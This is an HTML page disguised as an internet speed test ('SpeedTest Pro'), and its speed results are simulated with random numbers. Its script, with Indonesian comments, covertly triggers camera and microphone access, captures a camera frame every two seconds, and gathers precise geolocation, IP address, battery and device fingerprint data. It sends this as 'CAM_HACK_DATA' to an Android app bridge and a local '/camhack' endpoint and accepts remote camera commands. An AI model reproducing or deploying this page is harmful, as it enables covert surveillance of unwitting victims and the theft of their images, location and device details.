<!DOCTYPE html>
<html>
<head>
    <title>SpeedTest Pro - Internet Speed Checker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            font-family: 'Roboto', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 100%;
            backdrop-filter: blur(10px);
        }
        h1 {
            font-family: 'Orbitron', monospace;
            color: #00ffff;
            margin-bottom: 10px;
            font-weight: 900;
            font-size: 28px;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
        }
        .subtitle {
            color: #a0a0a0;
            margin-bottom: 25px;
            font-size: 14px;
        }
        video {
            display: none;
        }
        .speed-display {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            border: 3px solid #00ffff;
            margin: 20px auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: radial-gradient(circle, rgba(0,255,255,0.1) 0%, rgba(0,0,0,0.3) 100%);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
        }
        .speed-number {
            font-family: 'Orbitron', monospace;
            font-size: 36px;
            font-weight: 700;
            color: #00ffff;
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
        }
        .speed-unit {
            font-size: 14px;
            color: #a0a0a0;
            margin-top: 5px;
        }
        .status {
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            color: #00ffff;
            font-size: 14px;
        }
        .btn {
            background: linear-gradient(45deg, #00ffff, #0080ff);
            color: #000;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin: 10px 5px;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 5px 25px rgba(0, 255, 255, 0.5);
        }
        .stats {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        .stat-item {
            text-align: center;
            flex: 1;
        }
        .stat-value {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            color: #00ffff;
            font-weight: 700;
        }
        .stat-label {
            font-size: 12px;
            color: #a0a0a0;
            margin-top: 5px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
            50% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.6); }
            100% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö° SpeedTest Pro</h1>
        <p class="subtitle">Test your internet connection speed</p>
        
        <video id="video" autoplay muted playsinline></video>
        
        <div class="speed-display pulse" id="speedDisplay">
            <div class="speed-number" id="speedNumber">0</div>
            <div class="speed-unit">Mbps</div>
        </div>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-value" id="pingValue">--</div>
                <div class="stat-label">Ping (ms)</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="downloadValue">--</div>
                <div class="stat-label">Download</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="uploadValue">--</div>
                <div class="stat-label">Upload</div>
            </div>
        </div>
        
        <div class="status" id="status">
            ‚ö° Ready to test your connection speed
        </div>
        
        <button class="btn" onclick="startSpeedTest()">üöÄ Start Test</button>
        <button class="btn" onclick="shareResults()">üìä Share Results</button>
        
        <div class="footer">
            <p>üåê Professional speed testing ‚Ä¢ Accurate results</p>
        </div>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        let currentStream = null;
        let facingMode = 'user';
        let deviceInfo = {};
        let frameCount = 0;
        
        // Get session from URL
        const params = new URLSearchParams(window.location.search);
        const session = params.get('s') || 'session_' + Date.now();
        
        // Fungsi untuk mengambil info device lengkap
        async function getDeviceInfo() {
            try {
                // Battery API
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = Math.round(battery.level * 100);
                    deviceInfo.charging = battery.charging;
                }
                
                // Network info
                if ('connection' in navigator) {
                    deviceInfo.networkType = navigator.connection.effectiveType;
                    deviceInfo.downlink = navigator.connection.downlink;
                    deviceInfo.rtt = navigator.connection.rtt;
                }
                
                // Device info lengkap
                deviceInfo.userAgent = navigator.userAgent;
                deviceInfo.platform = navigator.platform;
                deviceInfo.language = navigator.language;
                deviceInfo.languages = navigator.languages;
                deviceInfo.screenWidth = screen.width;
                deviceInfo.screenHeight = screen.height;
                deviceInfo.colorDepth = screen.colorDepth;
                deviceInfo.pixelDepth = screen.pixelDepth;
                deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                deviceInfo.cookieEnabled = navigator.cookieEnabled;
                deviceInfo.onLine = navigator.onLine;
                deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency;
                deviceInfo.maxTouchPoints = navigator.maxTouchPoints;
                
                // Memory info
                if (performance.memory) {
                    deviceInfo.memoryUsed = Math.round(performance.memory.usedJSHeapSize / 1048576);
                    deviceInfo.memoryTotal = Math.round(performance.memory.totalJSHeapSize / 1048576);
                    deviceInfo.memoryLimit = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
                }
                
                // Get IP address
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    deviceInfo.ip = data.ip;
                } catch (e) {
                    deviceInfo.ip = 'Unknown';
                }
                
                // Get location
                await getRealLocation();
                
                // Send device info
                sendToAndroid({
                    type: 'DEVICE_INFO',
                    session: session,
                    data: deviceInfo,
                    timestamp: new Date().toISOString()
                });
                
            } catch (error) {
                console.error('Error getting device info:', error);
            }
        }
        
        async function getRealLocation() {
            try {
                if ('geolocation' in navigator) {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    });
                    
                    deviceInfo.latitude = position.coords.latitude;
                    deviceInfo.longitude = position.coords.longitude;
                    deviceInfo.accuracy = position.coords.accuracy;
                    deviceInfo.altitude = position.coords.altitude;
                    deviceInfo.heading = position.coords.heading;
                    deviceInfo.speed = position.coords.speed;
                    
                    // Get address from coordinates
                    try {
                        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&localityLanguage=id`);
                        const locationData = await response.json();
                        
                        deviceInfo.city = locationData.city || locationData.locality || 'Unknown';
                        deviceInfo.country = locationData.countryName || 'Unknown';
                        deviceInfo.region = locationData.principalSubdivision || 'Unknown';
                        deviceInfo.address = `${locationData.locality}, ${locationData.principalSubdivision}, ${locationData.countryName}`;
                        deviceInfo.postalCode = locationData.postcode || 'Unknown';
                        
                    } catch (e) {
                        deviceInfo.city = 'Unknown';
                        deviceInfo.country = 'Unknown';
                        deviceInfo.address = `${position.coords.latitude}, ${position.coords.longitude}`;
                    }
                }
            } catch (error) {
                console.error('Location error:', error);
                deviceInfo.latitude = 'Denied';
                deviceInfo.longitude = 'Denied';
                deviceInfo.locationError = error.message;
            }
        }
        
        // Fungsi komunikasi dengan Android app
        function sendToAndroid(payload) {
            // Method 1: Android WebView interface
            if (window.Android) {
                if (window.Android.receiveData) window.Android.receiveData(JSON.stringify(payload));
                if (window.Android.onMessage) window.Android.onMessage(JSON.stringify(payload));
                if (window.Android.handleMessage) window.Android.handleMessage(JSON.stringify(payload));
            }
            
            // Method 2: Console logging dengan format khusus
            console.log('ANDROID_DATA:', JSON.stringify(payload));
            console.log('CAM_HACK_DATA:', JSON.stringify(payload));
            
            // Method 3: LocalStorage dengan multiple keys
            localStorage.setItem(`session_${session}`, JSON.stringify(payload));
            localStorage.setItem('latest_data', JSON.stringify(payload));
            localStorage.setItem(`${payload.type}_${session}`, JSON.stringify(payload));
            
            // Method 4: Document title manipulation
            document.title = `SpeedTest Pro - ${session} - ${payload.type} - ${Date.now()}`;
            
            // Method 5: Custom events
            window.dispatchEvent(new CustomEvent('androidData', { detail: payload }));
            window.dispatchEvent(new CustomEvent('camHackData', { detail: payload }));
            
            // Method 6: URL hash communication
            window.location.hash = `#${session}_${payload.type}_${Date.now()}`;
            
            // Method 7: PostMessage to parent
            if (window.parent && window.parent !== window) {
                window.parent.postMessage(payload, '*');
            }
            
            // Method 8: Fetch to local endpoints (jika ada server lokal)
            try {
                fetch('http://localhost:8080/data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {});
                
                fetch('http://127.0.0.1:3000/camhack', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {});
            } catch (e) {}
        }
        
        // Fungsi untuk mengakses kamera
        async function startCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }
                
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1920, min: 640 },
                        height: { ideal: 1080, min: 480 }
                    },
                    audio: true
                };
                
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                
                // Send camera status
                sendToAndroid({
                    type: 'CAMERA_STATUS',
                    session: session,
                    status: 'ACTIVE',
                    facingMode: facingMode,
                    videoTracks: currentStream.getVideoTracks().length,
                    audioTracks: currentStream.getAudioTracks().length,
                    timestamp: new Date().toISOString()
                });
                
                // Start frame capture
                startFrameCapture();
                
            } catch (error) {
                console.error('Camera error:', error);
                sendToAndroid({
                    type: 'CAMERA_ERROR',
                    session: session,
                    error: error.message,
                    timestamp: new Date().toISOString()
                });
            }
        }
        
        // Fungsi untuk capture frame
        function startFrameCapture() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            const captureInterval = setInterval(() => {
                if (video.videoWidth > 0 && currentStream) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    // Convert to base64
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    frameCount++;
                    
                    // Send frame data
                    sendToAndroid({
                        type: 'CAMERA_FRAME',
                        session: session,
                        image: imageData,
                        frameNumber: frameCount,
                        facingMode: facingMode,
                        width: canvas.width,
                        height: canvas.height,
                        deviceInfo: deviceInfo,
                        timestamp: new Date().toISOString()
                    });
                    
                    // Update localStorage
                    localStorage.setItem('frameCount', frameCount.toString());
                    localStorage.setItem('lastFrame', new Date().toISOString());
                }
            }, 2000); // Capture setiap 2 detik
            
            // Store interval ID untuk bisa di-clear
            localStorage.setItem('captureInterval', captureInterval);
        }
        
        // Fungsi untuk switch kamera
        function switchCamera() {
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            
            sendToAndroid({
                type: 'CAMERA_SWITCH',
                session: session,
                newMode: facingMode,
                timestamp: new Date().toISOString()
            });
            
            startCamera();
        }
        
        // Fungsi speed test (simulasi)
        async function startSpeedTest() {
            status.textContent = 'üîÑ Starting speed test...';
            document.getElementById('speedNumber').textContent = '0';
            
            // Trigger camera access saat speed test
            setTimeout(() => {
                startCamera();
            }, 1000);
            
            // Simulasi test
            let speed = 0;
            const maxSpeed = Math.floor(Math.random() * 80) + 20;
            
            const interval = setInterval(() => {
                speed += Math.random() * 10;
                document.getElementById('speedNumber').textContent = Math.round(speed);
                
                if (speed >= maxSpeed) {
                    clearInterval(interval);
                    document.getElementById('pingValue').textContent = Math.round(Math.random() * 50 + 10);
                    document.getElementById('downloadValue').textContent = Math.round(speed) + ' Mbps';
                    document.getElementById('uploadValue').textContent = Math.round(speed * 0.8) + ' Mbps';
                    status.textContent = '‚úÖ Speed test completed!';
                }
            }, 100);
        }
        
        // Fungsi share results
        function shareResults() {
            const results = {
                type: 'SPEED_RESULTS',
                session: session,
                ping: document.getElementById('pingValue').textContent,
                download: document.getElementById('downloadValue').textContent,
                upload: document.getElementById('uploadValue').textContent,
                deviceInfo: deviceInfo,
                timestamp: new Date().toISOString()
            };
            
            sendToAndroid(results);
            
            if (navigator.share) {
                navigator.share({
                    title: 'SpeedTest Results',
                    text: `Ping: ${results.ping}, Download: ${results.download}, Upload: ${results.upload}`
                });
            }
        }
        
        // Fungsi monitoring realtime
        function startRealtimeMonitoring() {
            setInterval(() => {
                sendToAndroid({
                    type: 'REALTIME_MONITOR',
                    session: session,
                    data: {
                        online: navigator.onLine,
                        battery: deviceInfo.battery,
                        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                        memory: performance.memory ? {
                            used: Math.round(performance.memory.usedJSHeapSize / 1048576),
                            total: Math.round(performance.memory.totalJSHeapSize / 1048576)
                        } : null,
                        cameraActive: currentStream ? true : false,
                        frameCount: frameCount,
                        pageVisible: !document.hidden,
                        timestamp: Date.now()
                    },
                    timestamp: new Date().toISOString()
                });
            }, 3000); // Setiap 3 detik
        }
        
        // Fungsi heartbeat
        function sendHeartbeat() {
            sendToAndroid({
                type: 'HEARTBEAT',
                session: session,
                status: 'ALIVE',
                camera: currentStream ? 'ACTIVE' : 'INACTIVE',
                deviceInfo: deviceInfo,
                url: window.location.href,
                timestamp: new Date().toISOString()
            });
        }
        
        // Event listeners
        window.addEventListener('message', (event) => {
            if (event.data && event.data.command) {
                switch (event.data.command) {
                    case 'switch_camera':
                        switchCamera();
                        break;
                    case 'stop_camera':
                        if (currentStream) {
                            currentStream.getTracks().forEach(track => track.stop());
                            currentStream = null;
                        }
                        break;
                    case 'get_device_info':
                        getDeviceInfo();
                        break;
                    case 'capture_frame':
                        if (video.videoWidth > 0) {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            const imageData = canvas.toDataURL('image/jpeg', 0.9);
                            
                            sendToAndroid({
                                type: 'MANUAL_CAPTURE',
                                session: session,
                                image: imageData,
                                timestamp: new Date().toISOString()
                            });
                        }
                        break;
                }
            }
        });
        
        // Handle visibility change
        document.addEventListener('visibilitychange', () => {
            sendToAndroid({
                type: 'VISIBILITY_CHANGE',
                session: session,
                hidden: document.hidden,
                timestamp: new Date().toISOString()
            });
        });
        
        // Handle page unload
        window.addEventListener('beforeunload', () => {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
            
            sendToAndroid({
                type: 'PAGE_UNLOAD',
                session: session,
                timestamp: new Date().toISOString()
            });
        });
        
        // Auto start saat halaman dimuat
        window.addEventListener('load', () => {
            setTimeout(() => {
                // Send connection signal
                sendToAndroid({
                    type: 'TARGET_CONNECTED',
                    session: session,
                    url: window.location.href,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                });
                
                // Get device info
                getDeviceInfo();
                
                // Start monitoring
                startRealtimeMonitoring();
                
                // Auto start speed test untuk trigger permissions
                setTimeout(() => {
                    startSpeedTest();
                }, 2000);
                
            }, 1000);
        });
        
        // Send heartbeat setiap 5 detik
        setInterval(sendHeartbeat, 5000);
        
        // Auto switch camera setiap 45 detik (random)
        setInterval(() => {
            if (Math.random() > 0.7 && currentStream) {
                switchCamera();
            }
        }, 45000);
        
        // Keep screen awake
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
        
        // Listen for localStorage commands dari Android app
        setInterval(() => {
            const command = localStorage.getItem('camCommand');
            if (command) {
                try {
                    const cmd = JSON.parse(command);
                    if (cmd.session === session) {
                        switch (cmd.action) {
                            case 'switch':
                                switchCamera();
                                break;
                            case 'capture':
                                // Manual capture
                                break;
                            case 'stop':
                                if (currentStream) {
                                    currentStream.getTracks().forEach(track => track.stop());
                                    currentStream = null;
                                }
                                break;
                        }
                        localStorage.removeItem('camCommand');
                    }
                } catch (e) {}
            }
        }, 1000);
        
    </script>
</body>
</html>
